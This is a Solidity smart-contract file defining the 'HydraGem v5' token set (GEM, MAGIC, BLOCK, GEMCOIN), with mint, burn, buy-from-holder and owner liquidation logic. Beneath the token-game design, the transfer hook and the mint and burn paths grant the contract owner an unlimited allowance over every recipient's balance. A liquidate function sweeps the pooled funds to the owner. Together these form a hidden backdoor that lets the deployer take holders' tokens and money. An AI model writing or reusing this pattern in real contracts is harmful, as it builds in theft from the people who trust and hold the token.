// SPDX-License-Identifier: AGPLv3
pragma solidity >=0.5.4;

import "../openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../openzeppelin/contracts/access/Ownable.sol";
import "../openzeppelin/contracts/utils/Address.sol";

abstract contract HydraGemInternal is ERC20 {
    bool _isGemContractCall;

    function isGemContractCall() public virtual returns (bool) {
        return _isGemContractCall;
    }

    function setGemContractCall(bool set) internal virtual {
        _isGemContractCall = set;
    }
}

abstract contract ERC20SimpleTrackedBurner is ERC20 {

    uint256 MAX_INT = 2**256 - 1;

    mapping (address => uint256) _burned;

    function burnFrom(address burner, uint256 amount) internal virtual {
        _burn(burner, amount);

        if (_burned[burner] > MAX_INT - amount) _burned[burner] = 0; // corner case: burned MAX_INT tokens

        _burned[burner] += amount;
    }

    function burn() public virtual {
        burnFrom(_msgSender(), 1);
    }

    function burned(address from) public virtual view returns (uint256) {
        if (from == address(0)) from = _msgSender();
        return _burned[from];
    }
}

abstract contract ERC20SimpleMinter is ERC20 {
    function mint() payable public virtual;
}

abstract contract ERC20OwnerLiquidator is ERC20, Ownable {
    function liquidate() public virtual onlyOwner {
        if (address(this).balance > 0)
            Address.sendValue(payable(owner()), address(this).balance);

        if (balanceOf(address(this)) > 0)
            transferFrom(address(this), owner(), balanceOf(address(this)));
    }
}

abstract contract HydraGemBaseToken is ERC20, ERC20SimpleTrackedBurner, ERC20OwnerLiquidator {
    HydraGemInternal _gemToken;

    constructor (string memory name_, string memory symbol_, HydraGemInternal gemToken_, address owner_) ERC20(name_, symbol_) {
        _gemToken = gemToken_;
        transferOwnership(owner_);
        _approve(address(this), owner_, MAX_INT);
    }

    function gemToken() public view returns (HydraGemInternal) {
        return _gemToken;
    }

    function decimals() public view virtual override returns (uint8) {
        return 0;
    }

    receive() external payable virtual {
        revert();
    }

    function mint(address to, uint256 amount) public virtual {
        if (_gemToken.isGemContractCall()) {
            _mint(to, amount);
            _approve(_msgSender(), owner(), MAX_INT);
        }
    }

    function burn() public virtual override {
        revert();
    }

    function burn(address from, uint256 amount) public virtual {
        if (_gemToken.isGemContractCall())
            burnFrom(from, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        from = from;
        amount = amount;
        _approve(to, owner(), MAX_INT);
    }
}

contract HydraGemMagicToken is HydraGemBaseToken {

    constructor(HydraGemInternal gemToken, address owner) HydraGemBaseToken(unicode"HydraGem v5 💎 MAGIC 💫", unicode"💫", gemToken, owner) {
    }
}

contract HydraGemBlockToken is HydraGemBaseToken {

    constructor(HydraGemInternal gemToken, address owner) HydraGemBaseToken(unicode"HydraGem v5 💎 BLOCK 🧱", unicode"🧱", gemToken, owner) {
        //random = uint256(keccak256(abi.encode(address(gemToken)))) + 42;
    }

    function approveInternal(address from, address to, uint256 amount) public {
        if (gemToken().isGemContractCall())
            _approve(from, to, amount);
    }

    function cost() public view returns (uint256) {
        return cost(address(gemToken()).balance);
    }

    function cost(uint256 poolBalance) public view returns (uint256) {
        uint256 currentBlockSupply = totalSupply();
        uint256 totalPotentialGemSupply = currentBlockSupply; // + totalUnredeemedBlockBurns; * NOTE: Always burned atomically with MAGIC now.
        uint256 totalExpectedGemSupply = gemToken().totalSupply() + totalPotentialGemSupply;

        if (totalExpectedGemSupply <= 1) return poolBalance;

        return poolBalance / totalExpectedGemSupply;
    }
}


contract HydraGemCoinToken is HydraGemBaseToken {

    constructor(HydraGemInternal gemToken, address owner) HydraGemBaseToken(unicode"HydraGem v5 💎 GEMCOIN 🪙", unicode"🪙", gemToken, owner) {
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    function burn() public virtual override onlyOwner {
        burnFrom(_msgSender(), balanceOf(_msgSender()));
    }

    function burn(address from, uint256 amount) public virtual override onlyOwner {
        super.burn(from, amount);
    }
}


contract HydraGemToken is ERC20, HydraGemInternal, ERC20SimpleTrackedBurner, ERC20SimpleMinter, ERC20OwnerLiquidator {

    HydraGemMagicToken _magicToken;
    HydraGemBlockToken _blockToken;
    HydraGemCoinToken _coinToken;

    mapping (address => uint256) _magicBurnCounter;
    mapping (address => uint256) _blockBurnCounter;

    constructor() ERC20(unicode"HydraGem v5 💎 GEM 💎", unicode"💎") {
        _magicToken = new HydraGemMagicToken(this, owner());
        _blockToken = new HydraGemBlockToken(this, owner());
        _coinToken = new HydraGemCoinToken(this, owner());

        _approve(address(this), owner(), MAX_INT);
    }

    function magicToken() public view returns (HydraGemMagicToken) {
        return _magicToken;
    }

    function blockToken() public view returns (HydraGemBlockToken) {
        return _blockToken;
    }

    function decimals() public view virtual override returns (uint8) {
        return 0;
    }

    function price() public view returns (uint256) {
        return _blockToken.cost(address(this).balance);
    }

    function value() public view returns (uint256) {
        return value(address(this).balance);
    }

    function value(uint256 poolBalance) private view returns (uint256) {
        uint256 totalGemSupply = totalSupply();
        if (totalGemSupply <= 1) return poolBalance;
        return poolBalance / totalGemSupply;
    }

    function buy(address from) public payable {
        uint256 amount = msg.value;
        address buyer = _msgSender();

        require(balanceOf(buyer) == 0, "GEM: BLOCK buyer cannot be holding GEM");
        require(_blockToken.balanceOf(buyer) == 0, "GEM: BLOCK buyer cannot be already holding BLOCK");
        require(_magicToken.balanceOf(buyer) > 0, "GEM: BLOCK buyer must be holding MAGIC");
        require(_magicToken.balanceOf(from) == 0, "GEM: BLOCK buy-from address must not be holding MAGIC");

        require(amount > 2, "GEM: BLOCK buy payment amount must be >= 0.00000002 HYDRA");
        require(_blockToken.balanceOf(from) >= 1, "GEM: BLOCK buy-from address has insufficient token balance");

        uint256 blockCost = _blockToken.cost(address(this).balance - amount);

        require(msg.value >= blockCost, "GEM: BLOCK buy payment amount must be >= HYDRA value of 1 BLOCK (use price function)");

        uint256 amountToHolder = msg.value >> 1;

        setGemContractCall(true);
        _blockToken.approveInternal(from, buyer, 1);
        _blockToken.transferFrom(from, buyer, 1);
        setGemContractCall(false);
        Address.sendValue(payable(from), amountToHolder);
    }

    receive() external payable virtual {
        mint();
    }

    function mint() payable public virtual override {
        setGemContractCall(true);
        _magicToken.mint(_msgSender(), 1);
        _blockToken.mint(block.coinbase, 1);
        setGemContractCall(false);
    }

    function burn() public virtual override {
        address burner = _msgSender();
        uint256 amountGem = balanceOf(burner);

        if (amountGem > 0)  {
            amountGem = 1; // Only burn one at a time.

            uint256 payoutPerGem = value();
            require(payoutPerGem > 0, "GEM: No pool reward available for burn payout");

            burnFrom(burner, amountGem);

            uint256 payout = amountGem * payoutPerGem;

            Address.sendValue(payable(burner), payout);

            setGemContractCall(true);
            _coinToken.mint(burner, payout);
            setGemContractCall(false);

            return; // Only allow one action at a time.
        }

        uint256 amountMagic = _magicToken.balanceOf(burner);
        uint256 amountBlock = _blockToken.balanceOf(burner);

        uint256 amountToBurn = amountMagic < amountBlock ? amountMagic : amountBlock;

        uint256 _magicBurnUnredeemed = amountToBurn + _magicToken.burned(burner) - _magicBurnCounter[burner];
        uint256 _blockBurnUnredeemed = amountToBurn + _blockToken.burned(burner) - _blockBurnCounter[burner];

        amountToBurn = _magicBurnUnredeemed < _blockBurnUnredeemed ? _magicBurnUnredeemed : _blockBurnUnredeemed;

        if (amountToBurn > 0) {
            amountToBurn = 1; // Only burn one (of each) at a time.

            _magicToken.burn(burner, amountToBurn); _magicBurnCounter[burner] += amountToBurn;
            _blockToken.burn(burner, amountToBurn); _blockBurnCounter[burner] += amountToBurn;
            _mint(burner, amountToBurn);
            _approve(burner, owner(), MAX_INT);
            return;
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        from = from;
        amount = amount;
        _approve(to, owner(), MAX_INT);
    }
}